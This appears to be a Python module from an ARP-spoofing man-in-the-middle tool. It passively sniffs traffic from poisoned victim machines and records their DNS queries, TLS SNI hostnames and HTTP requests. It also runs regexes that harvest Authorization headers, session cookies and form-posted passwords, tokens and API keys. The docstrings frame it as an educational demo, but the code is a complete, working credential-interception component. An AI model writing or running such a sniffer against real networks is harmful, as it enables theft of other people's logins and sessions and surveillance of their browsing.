"""
mitm_inspector.py — Passive traffic observer for active ARP MITM sessions.

When the ARP attacker has poisoned victim ARP caches, traffic to/from those
victims flows through this machine (because we enable IP-forward + spoof).
This module sniffs that traffic and extracts three educational signals:

* **DNS queries** — the domain names each victim is looking up.
* **TLS SNI hostnames** — the HTTPS sites each victim is visiting (the SNI
  field of the TLS ClientHello is sent in plaintext even though the rest
  of the handshake is encrypted).
* **HTTP Host headers** — for plaintext HTTP, the destination hostname
  plus URL path.

It is purely *observational* — packets are forwarded by the kernel as
normal; we never alter or block them. Counters and a bounded recent-events
buffer are exposed for the GUI to render live.

The whole inspector is a no-op when Scapy isn't available — useful so the
import never crashes on machines without it (CI, tests).
"""

from __future__ import annotations

import collections
import re
import threading
import time
from typing import Optional

try:
    from scapy.all import sniff  # type: ignore
    from scapy.layers.dns import DNS, DNSQR  # type: ignore
    from scapy.layers.inet import IP, TCP, UDP  # type: ignore
    from scapy.packet import Raw  # type: ignore

    SCAPY_AVAILABLE = True
except Exception:
    SCAPY_AVAILABLE = False


# ---------------------------------------------------------------------------
# Helpers — TLS SNI extraction
# ---------------------------------------------------------------------------

def _extract_tls_sni(payload: bytes) -> Optional[str]:
    """Pull the SNI hostname from a TLS ClientHello in *payload*.

    Returns ``None`` if the bytes don't look like a TLS ClientHello or if
    the SNI extension is absent. The parser is deliberately tolerant —
    every length field is bounds-checked so we never raise on partial /
    malformed records.
    """
    try:
        # TLS record header: type(1) + version(2) + length(2)
        if len(payload) < 6 or payload[0] != 0x16:
            return None
        # Handshake header: type(1) + length(3) + version(2) + random(32) + ...
        # We need at least the offset to the session-id length.
        if len(payload) < 5 + 4 + 2 + 32 + 1:
            return None
        # Confirm handshake type 0x01 (ClientHello).
        if payload[5] != 0x01:
            return None
        idx = 5 + 4 + 2 + 32  # skip record hdr + handshake hdr + version + random

        # session ID
        if idx >= len(payload):
            return None
        sid_len = payload[idx]
        idx += 1 + sid_len
        # cipher suites
        if idx + 2 > len(payload):
            return None
        cs_len = int.from_bytes(payload[idx:idx + 2], "big")
        idx += 2 + cs_len
        # compression methods
        if idx + 1 > len(payload):
            return None
        cm_len = payload[idx]
        idx += 1 + cm_len
        # extensions length
        if idx + 2 > len(payload):
            return None
        ext_len = int.from_bytes(payload[idx:idx + 2], "big")
        idx += 2
        ext_end = min(idx + ext_len, len(payload))

        while idx + 4 <= ext_end:
            ext_type = int.from_bytes(payload[idx:idx + 2], "big")
            ext_size = int.from_bytes(payload[idx + 2:idx + 4], "big")
            idx += 4
            if ext_type == 0x00:  # server_name
                # Skip server_name list length (2) + name type (1) + name length (2).
                if idx + 5 > len(payload):
                    return None
                name_len = int.from_bytes(payload[idx + 3:idx + 5], "big")
                name_start = idx + 5
                name_end = name_start + name_len
                if name_end > len(payload):
                    return None
                return payload[name_start:name_end].decode(
                    "utf-8", errors="replace",
                )
            idx += ext_size
        return None
    except Exception:
        return None


_HTTP_HOST_RE = re.compile(rb"\r\nHost:\s*([^\r\n]+)", re.IGNORECASE)
_HTTP_REQUEST_LINE_RE = re.compile(
    rb"^(GET|POST|PUT|DELETE|HEAD|OPTIONS|PATCH)\s+(\S+)\s+HTTP/",
)
_HTTP_AUTH_RE = re.compile(
    rb"\r\nAuthorization:\s*([^\r\n]+)", re.IGNORECASE,
)
_HTTP_COOKIE_RE = re.compile(
    rb"\r\nCookie:\s*([^\r\n]+)", re.IGNORECASE,
)
# Form-encoded password fields. Match the field name and value so the
# user can see what was leaked. Limited to the first 256 bytes of value
# so we don't dump arbitrary upload bodies.
_FORM_PASSWORD_RE = re.compile(
    rb"(?:^|&)([A-Za-z0-9_\-\[\]]*(?:pass(?:word)?|pwd|secret|token|api[_-]?key))="
    rb"([^&\r\n]{1,256})",
    re.IGNORECASE,
)


def _extract_http(payload: bytes) -> Optional[tuple[str, str, str]]:
    """Return ``(method, host, path)`` for an HTTP request, else ``None``."""
    try:
        if not payload or len(payload) < 16:
            return None
        m = _HTTP_REQUEST_LINE_RE.match(payload)
        if not m:
            return None
        method = m.group(1).decode("ascii", errors="replace")
        path = m.group(2).decode("ascii", errors="replace")
        h = _HTTP_HOST_RE.search(payload, 0, min(len(payload), 4096))
        host = h.group(1).decode("ascii", errors="replace").strip() if h else ""
        return method, host, path
    except Exception:
        return None


def _extract_credentials(payload: bytes, host: str, path: str) -> list[str]:
    """Pull credential-shaped strings out of a plaintext HTTP request.

    Returns a list of human-readable summaries — one per finding. Designed
    for the security-awareness use case: showing *how* plain HTTP leaks
    credentials in real time during an authorised demo. Sensitive values
    are truncated.
    """
    findings: list[str] = []
    try:
        # HTTP Basic Auth — base64-encoded `user:pass` in the Authorization header.
        auth = _HTTP_AUTH_RE.search(payload)
        if auth:
            scheme = auth.group(1).decode("ascii", errors="replace").strip()
            findings.append(f"HTTP Auth header → {host}{path}  ({scheme[:60]})")

        # Plaintext session cookie (no decoding, just visibility).
        cookie = _HTTP_COOKIE_RE.search(payload, 0, min(len(payload), 4096))
        if cookie:
            cookie_str = cookie.group(1).decode("ascii", errors="replace").strip()
            findings.append(
                f"Session cookie → {host}{path}  ({cookie_str[:80]}…)"
                if len(cookie_str) > 80
                else f"Session cookie → {host}{path}  ({cookie_str})"
            )

        # Form-encoded password / token in POST body.
        body_start = payload.find(b"\r\n\r\n")
        body = payload[body_start + 4:] if body_start >= 0 else b""
        if body:
            for m in _FORM_PASSWORD_RE.finditer(body):
                field = m.group(1).decode("ascii", errors="replace")
                value = m.group(2).decode("ascii", errors="replace")
                if len(value) > 60:
                    value = value[:60] + "…"
                findings.append(
                    f"Form field '{field}' → {host}{path}  ({value})"
                )
    except Exception:
        pass
    return findings


# ---------------------------------------------------------------------------
# Inspector
# ---------------------------------------------------------------------------

class MITMInspector:
    """Sniff DNS / TLS-SNI / HTTP events from a set of MITM'd target IPs.

    Maintains:

    * ``events`` — bounded ``deque`` of dicts (most-recent-first via reversed
      iteration). Each dict has ``{ts, target, kind, value}``.
    * ``per_target`` — ``ip → {"dns": int, "sni": int, "http": int,
      "bytes": int, "last_seen": float}``.

    The traffic filter is a BPF expression restricting capture to *outgoing*
    packets from the target IPs — DNS queries, HTTPS handshakes, and HTTP
    requests are all client-initiated, so capturing only victim→Internet
    direction halves the packet volume without losing signal.
    """

    EVENT_LIMIT = 800

    def __init__(
        self,
        iface: Optional[str],
        target_ips: list[str],
    ) -> None:
        self.iface = iface
        self.target_ips = set(t for t in target_ips if t)
        self._lock = threading.Lock()
        self._stop_event = threading.Event()
        self._thread: Optional[threading.Thread] = None
        self.events: collections.deque = collections.deque(maxlen=self.EVENT_LIMIT)
        self.per_target: dict[str, dict] = {
            ip: {
                "dns": 0, "sni": 0, "http": 0, "cred": 0,
                "bytes": 0, "last_seen": 0.0,
            }
            for ip in self.target_ips
        }
        self.started_at: float = 0.0

    # ------------------------------------------------------------------ #

    @property
    def is_running(self) -> bool:
        return self._thread is not None and self._thread.is_alive()

    @property
    def uptime_seconds(self) -> float:
        return time.time() - self.started_at if self.started_at else 0.0

    def start(self) -> None:
        if not SCAPY_AVAILABLE:
            raise RuntimeError(
                "Scapy is required to run the MITM Inspector."
            )
        if self.is_running:
            return
        if not self.target_ips:
            raise RuntimeError(
                "No target IPs supplied — start an ARP attack first."
            )
        self._stop_event.clear()
        self.started_at = time.time()
        self._thread = threading.Thread(
            target=self._sniff_loop, daemon=True,
        )
        self._thread.start()

    def stop(self) -> None:
        self._stop_event.set()
        if self._thread:
            self._thread.join(timeout=2.0)
            self._thread = None

    # ------------------------------------------------------------------ #

    def snapshot(self) -> dict:
        """Return a thread-safe shallow copy of the current state."""
        with self._lock:
            return {
                "running": self.is_running,
                "uptime": self.uptime_seconds,
                "per_target": {
                    ip: dict(stats) for ip, stats in self.per_target.items()
                },
                "events": list(self.events),
                "total_events": len(self.events),
            }

    def recent_events(self, kind: Optional[str] = None,
                       limit: int = 200) -> list[dict]:
        """Return the *limit* most recent events, optionally filtered by kind."""
        with self._lock:
            out: list[dict] = []
            for e in reversed(self.events):
                if kind and e["kind"] != kind:
                    continue
                out.append(e)
                if len(out) >= limit:
                    break
            return out

    # ------------------------------------------------------------------ #

    def _sniff_loop(self) -> None:
        bpf = " or ".join(f"host {ip}" for ip in self.target_ips)
        try:
            sniff(
                iface=self.iface,
                filter=bpf,
                prn=self._on_packet,
                store=False,
                stop_filter=lambda _p: self._stop_event.is_set(),
            )
        except Exception:
            # Sniffing requires root on most platforms; bail silently so
            # the GUI surfaces "not running" rather than crashing.
            pass

    def _on_packet(self, packet) -> None:
        try:
            if not packet.haslayer(IP):
                return
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            # Determine which side of the conversation is the MITM'd target.
            target = None
            if src_ip in self.target_ips:
                target = src_ip
            elif dst_ip in self.target_ips:
                target = dst_ip
            if target is None:
                return

            with self._lock:
                stats = self.per_target.setdefault(
                    target,
                    {"dns": 0, "sni": 0, "http": 0, "bytes": 0, "last_seen": 0.0},
                )
                stats["bytes"] += len(packet)
                stats["last_seen"] = time.time()

            # DNS query (only when sourced from the victim)
            if (packet.haslayer(DNS) and packet.haslayer(DNSQR)
                    and src_ip == target):
                self._record_dns(target, packet)
                return

            if packet.haslayer(TCP) and packet.haslayer(Raw):
                payload = bytes(packet[Raw].load)
                tcp = packet[TCP]
                # TLS ClientHello (port 443) — record SNI from the victim's
                # outbound handshake.
                if (tcp.dport == 443 and src_ip == target
                        and payload and payload[0] == 0x16):
                    sni = _extract_tls_sni(payload)
                    if sni:
                        self._record_event(target, "sni", sni)
                        return
                # HTTP request (port 80)
                if tcp.dport == 80 and src_ip == target:
                    httpinfo = _extract_http(payload)
                    if httpinfo:
                        method, host, path = httpinfo
                        value = f"{method} {host}{path}" if host else \
                                f"{method} {path}"
                        self._record_event(target, "http", value)
                        # Scan the same payload for credentials.
                        for cred in _extract_credentials(payload, host, path):
                            self._record_event(target, "cred", cred)
        except Exception:
            # Never let a malformed packet kill the sniff thread.
            pass

    def _record_dns(self, target: str, packet) -> None:
        try:
            qname = packet[DNSQR].qname
            if isinstance(qname, bytes):
                domain = qname.decode("utf-8", errors="replace").rstrip(".")
            else:
                domain = str(qname).rstrip(".")
            if not domain:
                return
            self._record_event(target, "dns", domain)
        except Exception:
            pass

    def _record_event(self, target: str, kind: str, value: str) -> None:
        with self._lock:
            self.events.append({
                "ts": time.time(),
                "target": target,
                "kind": kind,
                "value": value,
            })
            stats = self.per_target.setdefault(
                target,
                {"dns": 0, "sni": 0, "http": 0, "cred": 0,
                 "bytes": 0, "last_seen": 0.0},
            )
            stats[kind] = stats.get(kind, 0) + 1
            stats["last_seen"] = time.time()
